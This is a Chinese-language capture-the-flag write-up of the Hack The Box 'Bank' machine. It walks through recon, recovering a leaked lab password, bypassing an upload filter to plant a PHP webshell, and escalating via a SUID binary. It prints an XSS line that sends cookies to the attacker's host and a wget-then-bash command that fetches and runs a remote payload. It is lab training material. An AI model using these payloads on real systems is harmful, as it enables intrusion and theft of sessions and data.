---
title: Bank (Hack The Box Writeup)
date: 2021-09-15T13:38:00+08:00
draft: false
url: "/2021/09/15/bank-hack-the-box-writeup/"
categories:
  - 滲透測試
  - Hack The Box
showToc: true
TocOpen: false
---

- URL : https://app.hackthebox.eu/machines/26
- IP : 10.129.29.200

## Recon

- Rustscan![](/uploads/2022/02/7b16e-ui0FgmM.png)Nmap- ![](/uploads/2022/02/4c500-Y6kACGg.png)通靈加 Host- ![](/uploads/2022/02/92656-iC631Jn.png)加 `/etc/hosts`加 Host 載下來看- ![](/uploads/2022/02/bd5e4-DhyF6x6.png)
- ![](/uploads/2022/02/711cf-aOo4atT.png)
- 發現 302 轉走，但其實是有資料ㄉ掃目錄- ![](/uploads/2022/02/ddc37-WqJPTBb.png)
- http://bank.htb/assets/
- ![](/uploads/2022/02/7150f-c9TaYlY.png)
- ![](/uploads/2022/02/28033-fEJpUyV.png)

## 嘗試傳 Webshell

- `support.php`![](/uploads/2022/02/8d36e-r1tRnO1.png)
- ![](/uploads/2022/02/5ddf7-iLxm8GZ.png)
- 看起來可以傳檔案
- ![](/uploads/2022/02/ba6f4-lcHhl04.png)但只能傳圖片嘗試用各種方法繞- ![](/uploads/2022/02/9837e-GxeRaCs.png)
- ![](/uploads/2022/02/337ac-UgrEjAo.png)
- ![](/uploads/2022/02/84b59-olvLN1G.png)
- 但基本上都失敗

## 取得密碼

- 通靈掃到 `/balance-transfer`![](/uploads/2022/02/9fa64-K3uPCGE.png)
- ![](/uploads/2022/02/dac21-ost4Ysx.png)發現裡面的資訊都有過加密- ![](/uploads/2022/02/77bc7-ci7houA.png)複製出來觀察 size

```python
a = a.replace("[ ]    ","")
a = a.split("\n")
l = []
for i in a:
    i = i.split("     ")
    l.append(int(i[1]))
l.sort()
print(l)
```

- 發現有一個檔案大小只有257![](/uploads/2022/02/7eda8-0ULnHZx.png)
- ![](/uploads/2022/02/bcc99-5hXHTeB.png)觀察檔案內容- ![](/uploads/2022/02/5c29b-f2WgmUU.png)
- 取得帳密`chris@bank.htb`
- `!##HTBB4nkP4ssw0rd!##`順利登入- ![](/uploads/2022/02/4ff67-qBwubSL.png)又回到 `support.php`- ![](/uploads/2022/02/90067-vCvpvvA.png)測各種副檔名繞過- ![](/uploads/2022/02/80951-rVUJA4g.png)
- `s.php%00.jpg`
- `s.php\x00.jpg`
- 都失敗測 XSS- `new Image().src="http://10.10.16.35:1234/"+document.cookie`
- ![](/uploads/2022/02/c9451-9IC6lyA.png)
- 成功檢查註解- ![](/uploads/2022/02/c7fd0-vbvc1Al.png)
- 發現可以用 `.htb`
- ![](/uploads/2022/02/d6575-OVhx9q9.png)
- ![](/uploads/2022/02/3593c-afIjbXp.png)成功上傳 Webshell- ![](/uploads/2022/02/1b4e3-PRCVt4b.png)

## 執行 Reverse shell

- `bank.htb/uploads/s.htb?A=wget 10.10.16.35:8000/s_HTB`
- `http://bank.htb/uploads/s.htb?A=bash%20s_HTB`
- ![](/uploads/2022/02/95444-CgDYY32.png)
- spawn`python -c 'import pty; pty.spawn("/bin/bash")'`

## 提權

- Kernel Version![](/uploads/2022/02/875cb-pSMl7YV.png)有奇怪的 SUID 程式- ![](/uploads/2022/02/6c267-CyjdJ1n.png)直接執行- ![](/uploads/2022/02/7364a-GBxNHv0.png)
- 就 Root shell ㄌ取得 Flag- Root![](/uploads/2022/02/bf045-gjxhnw5.png)User- ![](/uploads/2022/02/4b60b-oknOIgq.png)

## 嘗試不登入傳 shell

- 先隨便傳![](/uploads/2022/02/364e7-r4Ga6HL.png)Burp 改副檔名 `.htb`- ![](/uploads/2022/02/ed94a-lHtWkqM.png)上傳成功- ![](/uploads/2022/02/92fae-udGq3Oz.png)
- 所以取得密碼的那一段根本不用做就可以結束ㄌ= =

## 學到了

- php 副檔名方法
- 注意註解 QQ
